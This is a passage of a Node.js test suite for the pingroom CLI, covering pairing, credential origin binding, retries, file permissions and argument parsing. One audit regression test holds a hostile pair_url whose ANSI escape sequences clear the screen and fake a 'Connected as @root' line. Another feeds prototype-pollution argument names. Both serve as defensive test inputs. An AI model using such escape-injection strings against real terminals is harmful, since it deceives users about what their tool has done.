    assert.throws(() => readFileSync(join(home, 'credentials.json'), 'utf8'));
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('a narrow terminal degrades to the pair URL alone', async () => {
  const home = newHome();
  const { server, baseUrl } = await pairingServer([ACTIVE_PAIR]);
  try {
    const { status, stdout } = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_INTERNAL_TEST_TTY: '1', NODE_ENV: 'test', COLUMNS: '20' },
      { stdin: '1\n' },
    );
    assert.equal(status, 0);
    assert.doesNotMatch(stdout, /[█▄▀]/);
    assert.match(stdout, /Open: https:\/\/pingroom\.io\/app\/agents\/pair/);
    assert.match(stdout, /✓ Connected as/);
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('the email fallback claims over the unchanged claim/* endpoints', async () => {
  const home = newHome();
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/auth': () => ({
      status: 200,
      body: { credential: 'pre_claim_jwt', credential_type: 'pre_claim', expires_in: 900 },
    }),
    'POST /api/agent/auth/claim/start': () => ({
      status: 200,
      body: { message: 'Claim email sent.', expires_in: 900 },
    }),
    'POST /api/agent/auth/claim/complete': (body) => (JSON.parse(body).otp === '040176'
      ? { status: 200, body: { credential: 'active_jwt', credential_type: 'active', expires_in: 0, handle: 'agt_email01', scopes: [] } }
      : { status: 400, body: { error: 'invalid_otp', message: 'Invalid or expired code.' } }),
  });
  try {
    const { status, stdout, stderr } = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_INTERNAL_TEST_TTY: '1', NODE_ENV: 'test' },
      { stdin: '2\nme@example.com\n111111\n040176\n' }, // one wrong code, then the right one
    );
    assert.equal(status, 0, stderr);
    assert.match(stdout, /Email me a code/);
    assert.match(stdout, /the page shows a 6-digit code/);
    assert.match(stderr, /Invalid or expired code/);
    assert.match(stdout, /✓ Connected as @agt_email01/);
    // No room comes back from the email flow, so the CLI says how to pick one.
    assert.match(stdout, /pingroom config set default_room/);

    const start = received.find((r) => r.path === '/api/agent/auth/claim/start');
    assert.equal(start.auth, 'Bearer pre_claim_jwt');
    assert.equal(JSON.parse(start.body).email, 'me@example.com');
    // Never draws a QR on this branch.
    assert.doesNotMatch(stdout, /[█▄▀]/);
    assert.equal(JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8')).token, 'active_jwt');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('logout clears the credential, and says so when there was none', () => {
  const home = newHome();
  try {
    const empty = run(['logout'], { PINGROOM_HOME: home });
    assert.equal(empty.status, 0);
    assert.match(empty.stdout, /no stored credential/);

    seedCredential(home, { token: 'stored_tok', handle: 'agt_ab12cd34ef' });
    const out = run(['logout'], { PINGROOM_HOME: home });
    assert.equal(out.status, 0);
    assert.match(out.stdout, /logged out \(@agt_ab12cd34ef\)/);
    assert.throws(() => readFileSync(join(home, 'credentials.json'), 'utf8'));

    // After logout the tool is back to "not connected", not half-authenticated.
    const after = run(['ask', '--room', 'ab12cd', '-p', 'Deploy?'], { PINGROOM_HOME: home });
    assert.equal(after.status, 2);
    assert.match(after.stderr, /agent token is required/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('logout warns that PINGROOM_TOKEN keeps overriding it', () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok' });
  try {
    const { stdout } = run(['logout'], { PINGROOM_HOME: home, PINGROOM_TOKEN: 'env_tok' });
    assert.match(stdout, /PINGROOM_TOKEN is still set/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('help documents the credential store, the precedence, and the absence of a login command', () => {
  const { stdout } = run(['--help']);
  assert.match(stdout, /~\/\.pingroom\/credentials\.json/);
  assert.match(stdout, /PINGROOM_HOME/);
  // The paired credential is a real layer, not a dead field: resolveApiBase and
  // resolveRoom both consult it, so the documented chain has to name it.
  assert.match(stdout, /explicit flag\s+>\s+env var\s+>\s+~\/\.pingroom\/config\.json\s+>\s+the paired\s+credential\s+>\s+built-in default/);
  assert.match(stdout, /There is no "login" command/);
  assert.match(stdout, /^  activate /m);
  // Connecting sends nothing to the phone, and the help has to say so — the
  // optional test Question is what "activate" is for.
  assert.match(stdout, /connecting sends nothing to your phone/);
  assert.match(stdout, /Run "pingroom activate" if you want to prove the round-trip/);
  assert.match(stdout, /^  config   /m);
  assert.match(stdout, /^  logout   /m);
  assert.match(stdout, /stored credential is bound to the origin it was paired\s+against/);
  assert.match(stdout, /provide that host's token with --token or PINGROOM_TOKEN/);
});

// ---------------------------------------------------------------------------
// Regressions from the adversarial audit
//
// Every test below was written against a deliberately broken build first: each
// one fails if its fix is reverted. Several replace earlier tests that passed
// under mutation (a fresh-file-only permission check, a poll loop with no
// interval floor) and therefore proved nothing.
// ---------------------------------------------------------------------------

/**
 * Pairing stub whose /pair/status responses are scripted as raw HTTP results,
 * so a test can inject a 502, a 429 or a dropped socket. `drop: true` destroys
 * the connection, which is what the CLI sees as a network error. The last entry
 * repeats. `pairStart` overrides the pair/start body.
 */
function flakyPairingServer(responses, { pairStart = {} } = {}) {
  const received = [];
  const statusTimes = [];
  let poll = 0;
  let registrations = 0;
  return startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      const path = req.url.split('?')[0];
      received.push({ method: req.method, path, auth: req.headers['authorization'], body });
      if (path === '/api/agent/auth') {
        registrations += 1;
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ credential: 'pre_claim_jwt', credential_type: 'pre_claim', expires_in: 900, scopes: [] }));
        return;
      }
      if (path === '/api/agent/auth/pair/start') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          pair_token: 'p'.repeat(64),
          pair_url: `https://pingroom.io/app/agents/pair?token=${'p'.repeat(64)}`,
          expires_in: 900,
          poll_interval_ms: 10,
          ...pairStart,
        }));
        return;
      }
      if (path === '/api/agent/auth/pair/status') {
        statusTimes.push(Date.now());
        const spec = responses[Math.min(poll++, responses.length - 1)];
        if (spec.drop) { req.socket.destroy(); return; }
        res.writeHead(spec.httpStatus ?? 200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(spec.body ?? {}));
        return;
      }
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end('{}');
    });
  }).then((s) => ({
    ...s,
    received,
    statusTimes,
    get registrations() { return registrations; },
  }));
}

/** The env every interactive test needs, now that the TTY override is double-locked. */
function ttyEnv(home, extra = {}) {
  return { PINGROOM_HOME: home, PINGROOM_INTERNAL_TEST_TTY: '1', NODE_ENV: 'test', ...extra };
}

test('EOF on stdin ends pairing instead of restarting it forever', async () => {
  // The bug: ask() resolved '' at EOF, '' is falsy, and the restart guard read
  // falsy as "yes". Ctrl-D (or any pipe) then looped the for(;;) minting a fresh
  // anonymous registration every cycle — thousands of them per minute.
  const home = newHome();
  const stub = await flakyPairingServer([{ body: { status: 'expired' } }]);
  try {
    const { status, stdout, timedOut } = await runAsync(
      ['--api', stub.baseUrl],
      ttyEnv(home, { COLUMNS: '120' }),
      { stdin: '', timeoutMs: 15_000 }, // stdin closed immediately == Ctrl-D
    );
    assert.equal(timedOut, false, 'pairing must terminate on EOF, not spin');
    assert.equal(status, 3);
    assert.equal(stub.registrations, 1, 'EOF must not mint a second registration');
    assert.equal(
      stub.received.filter((r) => r.path === '/api/agent/auth/pair/start').length,
      1,
      'EOF must not start a second pairing round',
    );
    assert.match(stdout, /That code expired\./);
    // And it must not have written a half-formed credential on the way out.
    assert.throws(() => readFileSync(join(home, 'credentials.json'), 'utf8'));
  } finally {
    stub.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('an explicit "n" still declines, and "y" still restarts, after the EOF fix', async () => {
  // The EOF fix must not have collapsed the empty-line-means-yes default.
  const home = newHome();
  const stub = await flakyPairingServer([{ body: { status: 'expired' } }, { body: ACTIVE_PAIR }]);
  try {
    const { status, stdout } = await runAsync(
      ['--api', stub.baseUrl],
      ttyEnv(home, { COLUMNS: '120' }),
      { stdin: '1\n\n', timeoutMs: 15_000 }, // bare Enter at the restart prompt
    );
    assert.equal(status, 0, stdout);
    assert.equal(stub.registrations, 2, 'an empty line is still "yes, show another"');
    assert.match(stdout, /✓ Connected as @agt_ab12cd34ef/);
  } finally {
    stub.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('the credential is only ever presented to the host it was paired against', async () => {
  // saveCredential records api_url but resolveApiBase used to ignore it, so a
  // token minted by a staging/self-hosted server was sent to api.pingroom.io on
  // the very next command.
  const home = newHome();
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ABC123/questions': () => ({ status: 201, body: { id: 'q_paired', state: 'pending' } }),
  });
  try {
    seedCredential(home, {
      token: 'paired_tok',
      handle: 'agt_paired',
      room: { invite_code: 'ABC123' },
      api_url: baseUrl,
    });
    // No --api, no PINGROOM_API_URL, no config.api_url: only the credential says
    // where this token belongs.
    const { status, stdout } = await runAsync(['ask', '-p', 'Go?'], { PINGROOM_HOME: home });
    assert.equal(status, 0, stdout);
    assert.equal(stdout.trim(), 'q_paired');
    assert.equal(received.length, 1, 'the request must have reached the paired host');
    assert.equal(received[0].auth, 'Bearer paired_tok');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('pairing writes the api_url the credential was minted at', async () => {
  const home = newHome();
  const stub = await flakyPairingServer([{ body: ACTIVE_PAIR }]);
  try {
    const { status } = await runAsync(
      ['--api', stub.baseUrl],
      ttyEnv(home, { COLUMNS: '20' }),
      { stdin: '1\n', timeoutMs: 15_000 },
    );
    assert.equal(status, 0);
    const cred = JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8'));
    assert.equal(cred.api_url, stub.baseUrl);
  } finally {
    stub.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('config and env API overrides cannot redirect a stored credential to another origin', async () => {
  const home = newHome();
  const issuer = await questionServer({});
  const target = await questionServer({
    'POST /api/agent/rooms/ABC123/questions': () => ({ status: 201, body: { id: 'q_never', state: 'pending' } }),
  });
  try {
    seedCredential(home, { token: 'paired_tok', room: { invite_code: 'ABC123' }, api_url: issuer.baseUrl });

    run(['config', 'set', 'api_url', target.baseUrl], { PINGROOM_HOME: home });
    const viaConfig = await runAsync(['ask', '-p', 'Go?'], { PINGROOM_HOME: home });
    assert.equal(viaConfig.status, 2);
    assert.match(viaConfig.stderr, /stored credential is bound/);

    run(['config', 'set', 'api_url', ''], { PINGROOM_HOME: home });
    const viaEnv = await runAsync(['ask', '-p', 'Go?'], { PINGROOM_HOME: home, PINGROOM_API_URL: target.baseUrl });
    assert.equal(viaEnv.status, 2);
    assert.match(viaEnv.stderr, /--token or PINGROOM_TOKEN/);

    assert.equal(issuer.received.length, 0);
    assert.equal(target.received.length, 0, 'the stored bearer must not reach config/env override origins');
  } finally {
    issuer.server.close();
    target.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('an explicit flag or env token permits an intentional custom-origin override', async () => {
  const home = newHome();
  const target = await questionServer({
    'POST /api/agent/rooms/ABC123/questions': () => ({ status: 201, body: { id: 'q_override', state: 'pending' } }),
  });
  seedCredential(home, {
    token: 'stored_tok',
    room: { invite_code: 'ABC123' },
    api_url: 'https://issuer.example.test',
  });

  try {
    const viaFlag = await runAsync(
      ['ask', '--api', target.baseUrl, '--token', 'flag_tok', '-p', 'Go?'],
      { PINGROOM_HOME: home },
    );
    assert.equal(viaFlag.status, 0, viaFlag.stderr);

    const viaEnv = await runAsync(['ask', '-p', 'Go?'], {
      PINGROOM_HOME: home,
      PINGROOM_API_URL: target.baseUrl,
      PINGROOM_TOKEN: 'env_tok',
    });
    assert.equal(viaEnv.status, 0, viaEnv.stderr);
    assert.deepEqual(target.received.map((request) => request.auth), ['Bearer flag_tok', 'Bearer env_tok']);
  } finally {
    target.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('a same-origin API path override may use the stored credential', async () => {
  const home = newHome();
  const target = await questionServer({
    'POST /proxy/api/agent/rooms/ABC123/questions': () => ({ status: 201, body: { id: 'q_same_origin', state: 'pending' } }),
  });
  seedCredential(home, {
    token: 'paired_tok',
    room: { invite_code: 'ABC123' },
    api_url: `${target.baseUrl}/paired-path`,
  });

  try {
    const result = await runAsync(
      ['ask', '--api', `${target.baseUrl}/proxy`, '-p', 'Go?'],
      { PINGROOM_HOME: home },
    );
    assert.equal(result.status, 0, result.stderr);
    assert.equal(result.stdout.trim(), 'q_same_origin');
    assert.equal(target.received[0].auth, 'Bearer paired_tok');
  } finally {
    target.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('a transient 502, 429 or dropped connection does not abandon the pairing wait', async () => {
  for (const flake of [{ httpStatus: 502, body: { message: 'bad gateway' } }, { httpStatus: 429, body: {} }, { drop: true }]) {
    const home = newHome();
    const stub = await flakyPairingServer([flake, { body: ACTIVE_PAIR }]);
    try {
      const { status, stdout } = await runAsync(
        ['--api', stub.baseUrl],
        ttyEnv(home, { COLUMNS: '20' }),
        { stdin: '1\n', timeoutMs: 20_000 },
      );
      assert.equal(status, 0, `${JSON.stringify(flake)}: ${stdout}`);
      assert.match(stdout, /✓ Connected as @agt_ab12cd34ef/);
      assert.equal(stub.registrations, 1, 'a retry must reuse the same pre-claim, not re-register');
    } finally {
      stub.server.close();
      rmSync(home, { recursive: true, force: true });
    }
  }
});

test('401/403/404 during the pairing poll still fail immediately', async () => {
  for (const httpStatus of [401, 403, 404]) {
    const home = newHome();
    const stub = await flakyPairingServer([{ httpStatus, body: { message: 'gone' } }]);
    try {
      const { status, stderr } = await runAsync(
        ['--api', stub.baseUrl],
        ttyEnv(home, { COLUMNS: '20' }),
        { stdin: '1\n', timeoutMs: 15_000 },
      );
      assert.equal(status, 1, `HTTP ${httpStatus} must not be retried`);
      assert.match(stderr, /pairing failed/);
      const polls = stub.received.filter((r) => r.path === '/api/agent/auth/pair/status').length;
      assert.equal(polls, 1, `HTTP ${httpStatus} must not be polled twice`);
    } finally {
      stub.server.close();
      rmSync(home, { recursive: true, force: true });
    }
  }
});

test('a persistent outage stops at the deadline and says so, rather than retrying silently', async () => {
  const home = newHome();
  // expires_in 4s is the whole pairing window here, so the retry loop has to be
  // bounded by it. Without the bound this test hangs and the timeout fires.
  const stub = await flakyPairingServer([{ httpStatus: 503, body: { message: 'unavailable' } }], {
    pairStart: { expires_in: 4 },
  });
  try {
    const { status, stdout, timedOut } = await runAsync(
      ['--api', stub.baseUrl],
      ttyEnv(home, { COLUMNS: '20' }),
      { stdin: '1\n', timeoutMs: 25_000 },
    );
    assert.equal(timedOut, false, 'a persistent outage must terminate at the deadline');
    assert.equal(status, 3);
    // It retried rather than dying on the first 503 …
    const polls = stub.received.filter((r) => r.path === '/api/agent/auth/pair/status').length;
    assert.ok(polls >= 3, `expected several retries within the window, saw ${polls}`);
    // … told the user it was still trying …
    assert.match(stdout, /still trying/);
    // … and reported the outage instead of pretending the code expired.
    assert.match(stdout, /Gave up waiting — the server kept failing \(last: HTTP 503\)/);
    assert.doesNotMatch(stdout, /That code expired/);
  } finally {
    stub.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('the pairing poll never runs faster than the documented 1/second throttle', async () => {
  // AGENT_PAIRING_SPEC.md throttles GET pair/status at `60,1`. The stub asks for
  // 10ms; the floor must override it, or the pairing window is spent on 429s.
  const home = newHome();
  const stub = await flakyPairingServer([
    { body: { status: 'pending' } },
    { body: { status: 'pending' } },
    { body: ACTIVE_PAIR },
  ]);
  try {
    const { status } = await runAsync(
      ['--api', stub.baseUrl],
      ttyEnv(home, { COLUMNS: '20' }),
      { stdin: '1\n', timeoutMs: 20_000 },
    );
    assert.equal(status, 0);
    assert.equal(stub.statusTimes.length, 3);
    const gaps = stub.statusTimes.slice(1).map((t, i) => t - stub.statusTimes[i]);
    for (const gap of gaps) {
      // setTimeout never fires early, so a small tolerance only covers clock
      // granularity — a 250ms floor lands at ~250 and fails this.
      assert.ok(gap >= 950, `polls were ${gap}ms apart; the floor is 1000ms`);
      assert.ok(gap < 6000, `polls were ${gap}ms apart; the floor is not a stall`);
    }
  } finally {
    stub.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('a negative expires_in is clamped instead of producing a deadline in the past', async () => {
  // Math.max(1, …) is what stops `expires_in: -5` becoming a -5000ms lifetime,
  // which makes `Date.now() < deadline` false before the first poll and reports
  // "expired" without ever having asked the server anything.
  const home = newHome();
  const stub = await flakyPairingServer([{ body: ACTIVE_PAIR }], { pairStart: { expires_in: -5 } });
  try {
    const { status, stdout } = await runAsync(
      ['--api', stub.baseUrl],
      ttyEnv(home, { COLUMNS: '20' }),
      { stdin: '1\n', timeoutMs: 15_000 },
    );
    assert.equal(status, 0, stdout);
    assert.ok(
      stub.received.some((r) => r.path === '/api/agent/auth/pair/status'),
      'the clamp must leave at least one poll inside the window',
    );
    assert.match(stdout, /✓ Connected as/);
  } finally {
    stub.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('an "active" status with no credential fails loudly and writes nothing', async () => {
  // Dropping this guard writes `token: undefined` into credentials.json: the
  // file then exists, the CLI says "Connected", and every later command fails
  // with an unrelated auth error.
  for (const body of [{ status: 'active' }, { status: 'active', credential: '' }]) {
    const home = newHome();
    const stub = await flakyPairingServer([{ body }]);
    try {
      const { status, stderr } = await runAsync(
        ['--api', stub.baseUrl],
        ttyEnv(home, { COLUMNS: '20' }),
        { stdin: '1\n', timeoutMs: 15_000 },
      );
      assert.equal(status, 1, JSON.stringify(body));
      assert.match(stderr, /pairing succeeded but the server returned no credential/);
      assert.throws(() => readFileSync(join(home, 'credentials.json'), 'utf8'));
    } finally {
      stub.server.close();
      rmSync(home, { recursive: true, force: true });
    }
  }
});

test('a hostile pair_url cannot write ANSI escapes to the terminal', async () => {
  const home = newHome();
  const stub = await flakyPairingServer([{ body: { status: 'expired' } }], {
    pairStart: { pair_url: 'https://evil.test/p\u001b[2J\u001b[1;1H  ✓ Connected as @root\u0007' },
  });
  try {
    const { stdout } = await runAsync(
      ['--api', stub.baseUrl],
      ttyEnv(home, { COLUMNS: '20' }), // narrow: no QR, just the URL line
      { stdin: '1\nn\n', timeoutMs: 15_000 },
    );
    assert.ok(!stdout.includes('\u001b'), 'no ESC may reach the terminal');
    assert.ok(!stdout.includes('\u0007'), 'no BEL may reach the terminal');
    // The printable part still shows, so the user can see where they are going.
    assert.match(stdout, /Open: https:\/\/evil\.test\/p\[2J\[1;1H/);
  } finally {
    stub.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

// --- local state permissions ----------------------------------------------

/** Run the CLI under a specific umask, so mode assertions can't be vacuous. */
function runUmask(umask, args, env = {}) {
  const r = spawnSync('/bin/sh', ['-c', `umask ${umask}; exec "$0" "$@"`, process.execPath, CLI, ...args], {
    env: { ...baseEnv(), ...env },
    encoding: 'utf8',
  });
  return { status: r.status, stdout: r.stdout, stderr: r.stderr };
}

test('a fresh state directory and file are created 0700/0600 even under a permissive umask', () => {
  // umask 000 is what makes this assertion mean something: without the explicit
  // mode/chmod the directory would land at 0777 and the file at 0666.
  const parent = newHome();
  const home = join(parent, 'state');
  try {
    const { status } = runUmask('000', ['config', 'set', 'default_room', 'ab12cd'], { PINGROOM_HOME: home });
    assert.equal(status, 0);
    assert.equal(statSync(home).mode & 0o777, 0o700);
    assert.equal(statSync(join(home, 'config.json')).mode & 0o777, 0o600);
  } finally {
    rmSync(parent, { recursive: true, force: true });
  }
});

test('a pre-existing world-readable state file is tightened to 0600 on the next write', () => {
  // The original test only ever wrote a brand new file, so it passed with both
  // chmods deleted: `mode` on writeFileSync is ignored for an existing file.
  const home = newHome();
  const path = join(home, 'config.json');
  try {
    writeFileSync(path, '{"default_room":"old"}\n');
    chmodSync(path, 0o666);
    assert.equal(statSync(path).mode & 0o777, 0o666, 'precondition: the file starts loose');

    const { status } = runUmask('000', ['config', 'set', 'default_room', 'ab12cd'], { PINGROOM_HOME: home });
    assert.equal(status, 0);
    assert.equal(statSync(path).mode & 0o777, 0o600, '0666 -> 0600 is the tightening under test');
    assert.equal(JSON.parse(readFileSync(path, 'utf8')).default_room, 'ab12cd');
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('a pre-existing state directory keeps the mode its owner chose', () => {
  // The directory is the user's, not ours: narrowing a deliberate 0755 to 0700
  // breaks anything else the user pointed at PINGROOM_HOME. Only a directory
  // this call created gets the 0700 treatment.
  const home = newHome();
  try {
    chmodSync(home, 0o755);
    const { status } = runUmask('022', ['config', 'set', 'default_room', 'ab12cd'], { PINGROOM_HOME: home });
    assert.equal(status, 0);
    assert.equal(statSync(home).mode & 0o777, 0o755, 'a pre-existing directory must be left alone');
    // The file inside is still ours to protect.
    assert.equal(statSync(join(home, 'config.json')).mode & 0o777, 0o600);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('a config write replaces the file rather than truncating it in place', () => {
  // Writing in place means a crash or a full disk between truncate and write
  // leaves an unparseable file, and readConfigFile degrades that to {} — so the
  // next `config set` silently discards every other setting. rename() means a
  // reader only ever sees the whole old file or the whole new one.
  const home = newHome();
  const path = join(home, 'config.json');
  try {
    run(['config', 'set', 'default_room', 'ab12cd'], { PINGROOM_HOME: home });
    const firstInode = statSync(path).ino;

    run(['config', 'set', 'api_url', 'https://api.example.test'], { PINGROOM_HOME: home });
    const secondInode = statSync(path).ino;

    // A rename swaps in a different file; an in-place write keeps the inode.
    assert.notEqual(secondInode, firstInode, 'the write must be a rename, not a truncate');

    const stored = JSON.parse(readFileSync(path, 'utf8'));
    assert.deepEqual(stored, { default_room: 'ab12cd', api_url: 'https://api.example.test' });

    const leftovers = readdirSync(home).filter((f) => f.endsWith('.tmp'));
    assert.deepEqual(leftovers, [], 'the temp file must be renamed away, not left in place');
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

// --- argument parsing -------------------------------------------------------

test('inherited Object properties in flag position are not treated as options', async () => {
  // `alias[token]` walked the prototype chain, so `constructor` resolved to a
  // truthy value, was parsed as an option, and ate the argument after it —
  // here, the entire `-m hi` pair.
  const { server, baseUrl, received } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    });
  }).then((s) => ({ ...s, received: [] }));
  try {
    for (const poison of ['constructor', 'toString', '__proto__', 'valueOf', 'hasOwnProperty']) {
      const { status, stderr } = await runAsync(['ping', '-w', `${baseUrl}/hook`, poison, '-m', 'hi']);
      assert.equal(status, 0, `${poison} swallowed the message: ${stderr}`);
    }
    // And they are still rejected when they arrive as an actual flag.
    const { status, stderr } = await runAsync(['ping', '-w', `${baseUrl}/hook`, '--constructor', '-m', 'hi']);
    assert.equal(status, 2);
    assert.match(stderr, /Unknown option: --constructor/);
  } finally {
    server.close();
  }
});

test('config, logout, and handoffs reject flags they never read', () => {
  // These three shared parseQArgs, so `logout --wait --prompt x` parsed fine
  // and the flags were silently ignored — inconsistent with the strict
  // unknown-flag rejection every other command applies.
  const cases = [
    ['config', 'list', '--wait'],
    ['config', 'set', 'default_room', 'ab12cd', '--prompt', 'x'],
    ['logout', '--wait'],
    ['logout', '--prompt', 'x'],
    ['handoffs', '--prompt', 'x'],
    ['handoffs', '--wait'],
  ];
  for (const argv of cases) {
    const { status, stderr } = run(argv);
    assert.equal(status, 2, `${argv.join(' ')} should be a usage error`);
    assert.match(stderr, /Unknown option: --(wait|prompt)/);
  }
});

test('handoffs still accepts its own flags after the strict table', () => {
  // --state validation fires after parsing, so reaching its message proves
  // --state/--token parsed; --json and --api are covered by the API tests.
  const { status, stderr } = run(['handoffs', '--token', 'tok', '--state', 'answered']);
  assert.equal(status, 2);
  assert.match(stderr, /--state must be 'open' or 'all'/);
});

test('live rejects an empty --data the same way ping does', () => {
  // `if (args.data)` dropped `-d ''` on the floor and shipped the ping without
  // it; ping/ask/handoff all reject it. Silently sending different data than
  // the caller asked for is the worst of the three options.
  const live = run(['live', 'start', '-c', 'x', '--token', 't', '--room', 'ab12cd', '-d', '']);
  assert.equal(live.status, 2);
  assert.match(live.stderr, /--data must be valid JSON/);

  const png = run(['ping', '-w', 'https://example.test/hook', '-m', 'hi', '-d', '']);
  assert.equal(png.status, 2);
  assert.match(png.stderr, /--data must be valid JSON/);
});

// --- the interactive gate ---------------------------------------------------

test('interactivity needs BOTH streams to be a TTY, not just stdin', async () => {
  // Dropping the `stdout.isTTY` half passed every existing test, because the
  // suite only ever runs with both piped. This forces stdin.isTTY on via a
  // preload while stdout stays a pipe: the CLI must still refuse to prompt,
  // because a QR rendered into a pipe is unscannable garbage.
  const preloadDir = mkdtempSync(join(tmpdir(), 'pingroom-preload-'));
  const stdinOnly = join(preloadDir, 'stdin-tty.mjs');
  const bothTty = join(preloadDir, 'both-tty.mjs');
  writeFileSync(stdinOnly, 'process.stdin.isTTY = true;\n');
  writeFileSync(bothTty, 'process.stdin.isTTY = true;\nprocess.stdout.isTTY = true;\n');

  const home = newHome();
  const stub = await flakyPairingServer([{ body: { status: 'expired' } }]);
  try {
    // stdin is a TTY, stdout is not -> non-interactive.
    const piped = await runAsync(['--api', stub.baseUrl], { PINGROOM_HOME: home }, {
      execArgs: ['--import', pathToFileURL(stdinOnly).href],
      timeoutMs: 15_000,
    });
    assert.equal(piped.status, 0);
    assert.match(piped.stderr, /not connected/);
    assert.doesNotMatch(piped.stdout, /Choose \[1\]/);
    assert.equal(stub.registrations, 0, 'a non-interactive run must not start pairing');

    // Both TTYs -> the picker runs, with no PINGROOM_INTERNAL_TEST_TTY at all.
    const tty = await runAsync(['--api', stub.baseUrl], { PINGROOM_HOME: home, COLUMNS: '20' }, {
      execArgs: ['--import', pathToFileURL(bothTty).href],
      stdin: '1\nn\n',
      timeoutMs: 15_000,
    });
    assert.match(tty.stdout, /Choose \[1\]/);
    assert.equal(stub.registrations, 1);
  } finally {
    stub.server.close();
    rmSync(home, { recursive: true, force: true });
    rmSync(preloadDir, { recursive: true, force: true });
  }
});

test('the TTY override is double-locked so it cannot fire in a normal install', async () => {
  // A single well-known env var in the shipped binary is one stray `export`
  // away from making a CI job prompt into the void for the full pairing window.
  const home = newHome();
  const stub = await flakyPairingServer([{ body: { status: 'expired' } }]);
  try {
    // The retired name does nothing at all.
    const retired = await runAsync(['--api', stub.baseUrl], { PINGROOM_HOME: home, PINGROOM_FORCE_TTY: '1' }, { timeoutMs: 15_000 });
    assert.match(retired.stderr, /not connected/);

    // Neither half is sufficient on its own.
    const onlyFlag = await runAsync(['--api', stub.baseUrl], { PINGROOM_HOME: home, PINGROOM_INTERNAL_TEST_TTY: '1' }, { timeoutMs: 15_000 });
    assert.match(onlyFlag.stderr, /not connected/);

    const onlyEnv = await runAsync(['--api', stub.baseUrl], { PINGROOM_HOME: home, NODE_ENV: 'test' }, { timeoutMs: 15_000 });
    assert.match(onlyEnv.stderr, /not connected/);

    assert.equal(stub.registrations, 0, 'none of these may reach the pairing flow');
  } finally {
    stub.server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('the shipped binary does not advertise the TTY override', () => {
  const source = readFileSync(CLI, 'utf8');
  assert.doesNotMatch(source, /PINGROOM_FORCE_TTY/);
  // It must not be documented as a supported knob either.
  const { stdout } = run(['--help']);
  assert.doesNotMatch(stdout, /FORCE_TTY|INTERNAL_TEST_TTY/);
});

// ---------------------------------------------------------------------------
// ping --attach
// ---------------------------------------------------------------------------

test('help advertises the attachment type, size, and count contract', () => {
  const { status, stdout } = run(['--help']);
  assert.equal(status, 0);
  assert.match(stdout, /md\/pdf\/html\/txt\/jpg\/jpeg\/png\/zip, <= 5 MiB/);
  assert.match(stdout, /repeat for up to 4/);
});

test('--attach uploads each file as multipart and sends only the ids', async () => {
  const uploads = [];
  let pingBody = null;

  const { server, baseUrl } = await startServer(async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const raw = Buffer.concat(chunks);

    if (req.url === '/api/agent/attachments') {
      uploads.push({
        contentType: req.headers['content-type'],
        raw: raw.toString('latin1'),
      });
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ attachment: { id: `att_${uploads.length}` } }));
      return;
    }

    pingBody = JSON.parse(raw.toString('utf8'));
    res.writeHead(201, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ id: 'n1' }));
  });

  const dir = mkdtempSync(join(tmpdir(), 'pingroom-attach-'));
  const notes = join(dir, 'notes.txt');
  const brief = join(dir, 'brief.md');
  const page = join(dir, 'page.html');
  const maxSize = join(dir, 'max-size.txt');
  writeFileSync(notes, 'private notes');
  writeFileSync(brief, '# brief');
  writeFileSync(page, '<p>status</p>');
  writeFileSync(maxSize, Buffer.alloc(5 * 1024 * 1024, 65));

  try {
    const { status } = await runAsync([
      'ping', '-m', 'report attached',
      '--attach', notes,
      '--attach', brief,
      '--attach', page,
      '--attach', maxSize,
      '--token', 'tok_abc', '--room', 'AB12', '--api', baseUrl,
    ]);

    assert.equal(status, 0);
    assert.equal(uploads.length, 4);
    // The runtime must own the boundary — a hand-set Content-Type breaks it.
    assert.match(uploads[0].contentType, /^multipart\/form-data; boundary=/);
    assert.match(uploads[0].raw, /filename="notes\.txt"/);
    assert.match(uploads[0].raw, /private notes/);
    assert.match(uploads[1].raw, /filename="brief\.md"/);
    assert.match(uploads[2].raw, /filename="page\.html"/);
    assert.match(uploads[3].raw, /filename="max-size\.txt"/);

    // Flag order is claim order, and no bytes ride the JSON ping body.
    assert.deepEqual(pingBody.attachment_ids, ['att_1', 'att_2', 'att_3', 'att_4']);
    assert.equal(pingBody.message, 'report attached');
  } finally {
